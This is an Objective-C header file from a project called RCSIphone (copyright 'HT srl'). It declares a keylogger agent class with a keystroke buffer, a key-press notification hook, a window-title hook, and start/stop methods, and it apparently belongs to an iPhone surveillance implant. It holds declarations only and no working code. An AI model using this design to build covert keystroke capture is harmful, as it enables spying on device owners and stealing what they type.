//
//  RCSIAgentInputLogger.h
//  RCSIphone
//
//  Created on 3/8/10.
//  Copyright 2010 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#import "RCSIAgent.h"

#define KEY_MAX_BUFFER_SIZE   0x10

@interface agentKeylog : RCSIAgent
{
  NSMutableString *mBufferString;
  BOOL mContextHasBeenSwitched;
}

- (void)setTitleHook: (id)arg1;
- (void)keyPressed: (NSNotification *)aNotification;

- (BOOL)start;
- (void)stop;

@end